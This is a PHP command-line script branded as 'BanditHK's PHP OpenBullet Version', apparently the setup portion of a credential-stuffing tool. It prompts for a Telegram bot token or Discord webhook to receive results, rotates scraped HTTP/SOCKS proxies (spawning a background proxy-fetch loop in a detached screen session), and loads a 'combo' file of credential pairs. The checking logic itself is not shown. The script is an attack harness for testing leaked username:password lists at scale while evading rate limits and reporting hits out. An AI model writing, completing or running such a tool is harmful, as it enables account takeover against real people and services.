error_reporting(0);
ini_set('display_errors', 0);
function start(){
system("clear");
echo "
__________                    .___.__  __     ___ ___  ____  __.
\______   \_____    ____    __| _/|__|/  |_  /   |   \|    |/ _|
 |    |  _/\__  \  /    \  / __ | |  \   __\/    ~    \      <
 |    |   \ / __ \|   |  \/ /_/ | |  ||  |  \    Y    /    |  \
 |______  /(____  /___|  /\____ | |__||__|   \___|_  /|____|__ \
        \/      \/     \/      \/                  \/         \/
\n";
echo "Welcome to BanditHK's PHP OpenBullet Version \n\n";

retry1:
echo "[1]Telegram\n[2]Discord\n\nSelect your webhook app: ";
$choice = trim(fgets(STDIN));

//Vars
if($choice == "1"){
  teleretry:
echo "[+]Enter Your id: ";

$teleid = trim(fgets(STDIN));

if(trim($teleid) == ''){
    echo "RETRYING!\n";
      goto teleretry;
}

echo "[+]Enter Your bot token: ";

$teletoken = trim(fgets(STDIN));
if(trim($teletoken) == ''){
    echo "RETRYING!\n";
    goto teleretry;
}
$discordurl = "";
$discorddata = "";

}elseif($choice == "2"){
  retry2:
echo "[+]Enter Discord webhook url: ";
$discordurl = trim(fgets(STDIN));
if($discordurl == '' || !str_contains($discordurl,"https://discord.com")){
  echo "Please Enter valid url.. \n";
  goto retry2;
}
$teleid = "";
$teletoken ="";
}else{
echo "RETRYING!\n";
      goto retry1;
}
proxyretry:
echo "[+]Proxy Source\n\n[1]Proxy from File\n[2]Api proxy refreshed every 10 seconds(Linux only)\n\n[+]Enter Choice: ";
$proxysource = (int) trim(fgets(STDIN));
  if($proxysource == "1"){
  echo "[+]Enter Proxy filename: ";
$proxyfile = trim(fgets(STDIN));
$plist = file("$proxyfile");
if($plist == false){
  echo "File not found, retry\n";
  goto proxyretry;
}
proxytyperetry:
echo "Proxy type: \n";
echo "[1]HTTPS\n[2]Socks5\n[3]Socks4\n\nEnter Choice: ";
$proxychoice = (int)trim(fgets(STDIN));
if($proxychoice == "1"){
  $proxytype = "CURLPROXY_HTTP";
}elseif($proxychoice == "2"){
  $proxytype = "CURLPROXY_SOCKS5";
}elseif($proxychoice == "3"){
    $proxytype = "CURLPROXY_SOCKS4";
  }
else{
  echo "Invalid choice, retry";
  goto proxytyperetry;
}
}elseif($proxysource == "2"){
  file_put_contents('proxy.php','restart:
$ch = curl_init();
curl_setopt_array($ch,array(
  CURLOPT_URL => 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_HTTPHEADER => array('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36'),
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
));

$resp = curl_exec($ch);
curl_close($ch);
file_put_contents('http-proxy.txt',$resp);
sleep(600);
goto restart;',);
  system("screen -dmS screen php proxy.php");
  $proxytype = 'CURLPROXY_HTTP';
  echo 'Proxy is being pulled from Proxyscrape with type HTTP\n';
  }
combochoice2:
  echo "[+]Enter combo filename: ";
  $comboname = trim(fgets(STDIN));
  $combo = file("$comboname");
  if($combo == false){
    echo "Invalid Combo Name, please retry\n";
    goto combochoice2;
}
  $count = count($combo);
return [$combo,$choice,$proxytype,$teleid,$teletoken,$discordurl,$count,$plist];
}
function show_status($done, $total, $size=30) {

    static $start_time;

    // if we go over our bound, just ignore it
    if($done > $total) return;

    if(empty($start_time)) $start_time=time();
    $now = time();

    $perc=(double)($done/$total);

    $bar=floor($perc*$size);

    $status_bar="\t\t\t[";
    $status_bar.=str_repeat("=", $bar);
    if($bar<$size){
        $status_bar.=">";
        $status_bar.=str_repeat(" ", $size-$bar);
    } else {
        $status_bar.="=";
    }

    $disp=number_format($perc*100, 0);

    $status_bar.="] $disp%  $done/$total";

    $rate = ($now-$start_time)/$done;
    $left = $total - $done;
    $eta = round($rate * $left, 2);

    $elapsed = $now - $start_time;

    $status_bar.= " remaining: ".number_format($eta)." sec.  elapsed: ".number_format($elapsed)." sec.";

    echo "$status_bar  ";

    flush();

    // when done, send a newline
    if($done == $total) {
        echo "\n";
    }

}
function replaceOut($str)
{
    $numNewLines = substr_count($str, "\n");
    echo chr(27) . "[0G"; // Set cursor to first column
    echo $str;
    echo chr(27) . "[" . $numNewLines ."A"; // Set cursor up x lines
}
function webhook($choice,$discordurl,$discorddata,$telegramdata,$params,$teletoken){
if($choice == "1"){
$telegram = curl_init();
curl_setopt_array($telegram,array(
  CURLOPT_URL => 'https://api.telegram.org/bot'.$teletoken.'/sendMessage',
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => ($params),
));
  $tele = curl_exec($telegram);
  curl_close($telegram);
        return 0;}
else{
        $postdata = json_encode($discorddata);
    $ch = curl_init("$discordurl");
   curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt( $ch, CURLOPT_POST, 1);
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $postdata);
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt( $ch, CURLOPT_HEADER, 0);
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 0);
        $response = curl_exec( $ch );
        echo $response;
        curl_close( $ch );
}
}
 function getProxy(){
               restart:
$ch = curl_init();
curl_setopt_array($ch,array(
  CURLOPT_URL => 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_HTTPHEADER => array('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36'),
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
));

$resp = curl_exec($ch);
curl_close($ch);
file_put_contents('http-proxy.txt',$resp);
sleep(600);
goto restart;
 }
